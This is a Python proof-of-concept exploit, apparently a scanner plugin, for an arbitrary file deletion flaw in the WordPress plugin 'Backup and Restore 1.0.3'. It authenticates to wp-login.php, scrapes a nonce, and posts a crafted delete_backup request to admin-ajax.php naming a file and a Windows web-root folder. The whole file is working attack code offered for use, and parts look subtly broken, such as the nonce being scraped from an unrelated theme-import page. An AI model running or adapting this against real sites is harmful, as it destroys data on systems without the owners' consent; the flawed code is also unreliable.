# coding: utf-8
import requests
import random

#WordPress Plugin Backup and Restore 1.0.3 - Arbitrary File Deletion
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {'User-Agent': user_agent}
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        auth  = session.post(auth_url, headers=header, data=data, timeout=5)

    # Get Security nonce value:
    check = session.get(url+ '/wp-admin/themes.php?page=catch-themes-demo-import').text
    with open('../../data/b.html','w') as f:
        f.write(check)
    nonce = check[check.find('ajax_nonce"') + 13:]
    wp_nonce = nonce[:nonce.find('"')]
    # print(wp_nonce)
    if nonce.find('ajax_nonce"'):
        nonce = nonce[nonce.find('ajax_nonce"') + 13:]
        wp_nonce = nonce[:nonce.find('"')]
        # print(wp_nonce)

    # 漏洞位置
    exploit_url = url + '/wp-admin/admin-ajax.php'
    exp_data={
        'action':'barfw_backup_ajax_redirect',
        'call_type':'delete_backup',
        'file_name':'license.txt',
        'folder_name':'C%3a%5cxampp%5chtdocs%5cwordpress%5c%5c',
        'id':'5',
        'nonce':wp_nonce
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.post(exploit_url, headers=header, data=exp_data,proxies=proxies)
    else:
        response = session.post(exploit_url, headers=header, data=exp_data)


    if response.status_code==200 and 'success' in response.text:
        return 'WordPress Plugin Backup and Restore 1.0.3 - 任意文件删除'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

